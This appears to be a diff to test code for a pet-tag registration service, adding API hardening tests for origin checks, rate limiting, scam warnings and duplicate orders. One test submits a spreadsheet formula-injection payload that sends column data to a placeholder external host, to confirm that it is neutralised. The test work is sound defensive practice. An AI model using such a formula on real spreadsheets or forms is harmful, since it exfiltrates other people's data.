@@ -59,7 +59,7 @@ await test('register with phone2 + notes stores extras in KV and returns short l
   assert.match(admin.payload.text, /QR/);
   assert.match(admin.payload.text, /New order FY\d+/);
   assert.match(admin.payload.text, /1 tag · 49 ₪ — <b>1 physical tag<\/b>/);
-  assert.match(admin.payload.text, /Engrave front: <b>BELLA<\/b> · 050-123-4567/);
+  assert.match(admin.payload.text, /Lid: <b>BELLA<\/b> · 050-123-4567/);
   assert.equal(admin.payload.reply_markup.inline_keyboard[0][2].callback_data, `ord:FY${tagId}:shipped`);
 });
 
@@ -206,7 +206,7 @@ await test('bot registration: 3 + 1 → 2 pets + 2 spares (one each), one order,
   const admin = [...state.tg].reverse().find((c) => c.payload.chat_id === 'admin').payload.text;
   assert.match(admin, /4 tags \(3 \+ 1\) · 147 ₪ — <b>4 physical tags<\/b>/);
   assert.match(admin, /Tag 4 of 4 — #\d+ \(spare\)/);
-  assert.match(admin, /Engrave front: <b>MIKA<\/b>/);
+  assert.match(admin, /Lid: <b>MIKA<\/b>/);
   const reg = state.tg.filter((c) => c.payload.chat_id === C && c.method === 'sendMessage').at(-2).payload.text;
   assert.match(reg, /Order <b>FY\d+<\/b> · 4 tags \(3 \+ 1\) · 147 ₪/);
   assert.match(reg, /\/care — FindYpet Care, coming soon/);
@@ -643,6 +643,95 @@ await test('landing: 3 + 1 everywhere (1 / 2 / 4 tags in the form), no 2 + 1 lef
   assert.match(home, /data-i="3">\s*<div class="ft-head">.*class="ft-spare-chk" checked/); // 4-й (подарок) — запасной по умолчанию
   assert.doesNotMatch(home, /data-i="2">\s*<div class="ft-head">.*class="ft-spare-chk" checked/);
   for (const l of ['bundleBadge: "4th tag free"', 'bundleBadge: "התג הרביעי במתנה"', 'bundleBadge: "Четвёртый в подарок"']) assert.ok(i18n.includes(l), l);
+});
+
+// ---------- Стадия 1 аудита: защита API ----------
+function fakeLimiter(max) {
+  const seen = new Map();
+  return { async limit({ key }) { const n = (seen.get(key) || 0) + 1; seen.set(key, n); return { success: n <= max }; } };
+}
+
+await test('API: only JSON from our own pages; other sites and form posts are refused', async () => {
+  const r1 = await call(env, '/api/found', { method: 'POST', body: { id_tag: 1 }, headers: { Origin: 'https://evil.example' } });
+  assert.equal(r1.status, 403);
+  const r2 = await worker.fetch(new Request('http://localhost:8787/api/register', { method: 'POST',
+    headers: { 'Content-Type': 'text/plain' }, body: '{"owner_name":"x"}' }), env, { waitUntil() {} });
+  assert.equal(r2.status, 415);
+  const ok = await call(env, '/api/register', { method: 'POST', body: { owner_name: 'Same', phone: '050-777-1111', pet_name: 'Pip', address: 'Haifa', consent: true },
+    headers: { Origin: 'http://localhost:8787' } });
+  assert.equal((await ok.json()).success, true);
+  const pre = await call(env, '/api/tag?id=1', { method: 'OPTIONS' });
+  assert.notEqual(pre.headers.get('Access-Control-Allow-Origin'), 'https://evil.example');
+});
+
+await test('API: rate limits per visitor and per tag; tag page shows "try again", not "not found"', async () => {
+  const e = makeEnv({ RL_READ: fakeLimiter(2), RL_SIGNAL: fakeLimiter(100), RL_ORDER: fakeLimiter(1), RL_TAG: fakeLimiter(3) });
+  const ip = { 'CF-Connecting-IP': '203.0.113.9' };
+  for (let i = 0; i < 2; i++) assert.notEqual((await call(e, '/api/tag?id=101', { headers: ip })).status, 429);
+  const t = await call(e, '/api/tag?id=101', { headers: ip });
+  assert.equal(t.status, 429); assert.equal((await t.json()).error, 'temp_error');
+  const body = { owner_name: 'Flood', phone: '050-777-2222', pet_name: 'Rex', address: 'Haifa', consent: true };
+  assert.equal((await call(e, '/api/register', { method: 'POST', body, headers: ip })).status, 200);
+  assert.equal((await call(e, '/api/register', { method: 'POST', body, headers: ip })).status, 429);
+  // 3 оповещения в минуту на жетон, даже с разных адресов
+  const d = await (await call(env, '/api/register', { method: 'POST', body: { owner_name: 'Owner', phone: '050-777-3333', pet_name: 'Tom', address: 'Haifa', consent: true } })).json();
+  state.tags.find((x) => x.tag_id === String(d.id_tag)).telegram_chat_id = 'rl1';
+  const codes = [];
+  for (let i = 0; i < 5; i++) {
+    codes.push((await call(e, '/api/location', { method: 'POST', body: { id_tag: d.id_tag, lat: 32 + i / 100, lon: 34.9 },
+      headers: { 'CF-Connecting-IP': `198.51.100.${i}` } })).status);
+  }
+  assert.deepEqual(codes, [200, 200, 200, 429, 429]);
+});
+
+await test('"found" messages warn the owner about money scams', async () => {
+  const d = await (await call(env, '/api/register', { method: 'POST', body: { owner_name: 'Safe', phone: '050-777-4444', pet_name: 'Lucky', address: 'Haifa', consent: true } })).json();
+  state.tags.find((x) => x.tag_id === String(d.id_tag)).telegram_chat_id = 'safe1';
+  await call(env, '/api/location', { method: 'POST', body: { id_tag: d.id_tag, lat: 32.1, lon: 34.8 } });
+  const m = state.tg.filter((c) => c.payload.chat_id === 'safe1' && c.method === 'sendMessage').pop().payload.text;
+  assert.match(m, /never asks anyone for money/);
+});
+
+await test('names and addresses cannot become spreadsheet formulas', async () => {
+  const d = await (await call(env, '/api/register', { method: 'POST', body: {
+    owner_name: '=IMAGE("https://x.example/?"&C:C)', phone: '050-777-5555', pet_name: '+Rex', address: '@Haifa', consent: true } })).json();
+  const row = state.tags.find((x) => x.tag_id === String(d.id_tag));
+  assert.equal(row.owner_name, 'IMAGE("https://x.example/?"&C:C)');
+  assert.equal(row.pet_name, 'Rex'); assert.equal(row.address, 'Haifa');
+});
+
+await test('bot: two quick taps on Confirm create one order', async () => {
+  const C = '7404';
+  state.states[C] = { step: 'confirm', owner_name: 'Twice', phone: '+972541112222', pet_name: 'Dot', address: 'Haifa', slots: 1, pets: ['Dot'] };
+  const n = state.tags.length;
+  // второе нажатие приходит, пока первое ещё создаёт заказ (таблица отвечает медленно)
+  const first = tgUpdate(env, cb(C, 'reg_ok'));
+  await new Promise((r) => setTimeout(r, 5));
+  await Promise.all([first, tgUpdate(env, cb(C, 'reg_ok'))]);
+  assert.equal(state.tags.length, n + 1);
+});
+
+await test('order funnel: site events are counted; /stats only for admin', async () => {
+  for (const e of ['plan', 'plan', 'form', 'submit', 'tg']) await call(env, '/api/ev', { method: 'POST', body: { e, lang: 'ru' } });
+  assert.equal((await call(env, '/api/ev', { method: 'POST', body: { e: 'hack' } })).status, 400);
+  await tgUpdate(env, msg('admin', '/stats'));
+  const t = lastTg('sendMessage').payload.text;
+  assert.match(t, /Chose a plan: 2/); assert.match(t, /Sent an order: 1/); assert.match(t, /ru 2/);
+  const before = state.tg.length;
+  await tgUpdate(env, msg('stranger', '/stats'));
+  assert.ok(!state.tg.slice(before).some((c) => /Order funnel/.test(c.payload.text || '')));
+});
+
+await test('texts: printed (not engraved) everywhere; finder button says "Notify the owner"', async () => {
+  const home = await (await call(env, '/')).text();
+  const i18n = await (await call(env, '/js/i18n.js')).text();
+  const tag = await (await call(env, '/t/101')).text();
+  for (const [name, txt] of [['landing', home], ['i18n', i18n], ['tag page', tag]]) {
+    assert.doesNotMatch(txt, /engrav|гравир|выгравир|חרוט|חורט|חריטה/i, name);
+  }
+  assert.match(tag, /data-t="notify">Notify the owner/); assert.match(tag, /FindYpet never asks finders for money/);
+  assert.match(tag, /id="notesText" dir="auto"/);
+  assert.doesNotMatch(i18n, /„אבד”/); assert.doesNotMatch(i18n, /Я потерялся/);
 });
 
 // Проверки после выкладки (deploy-worker.yml) ищут строки в ответах Worker'а.
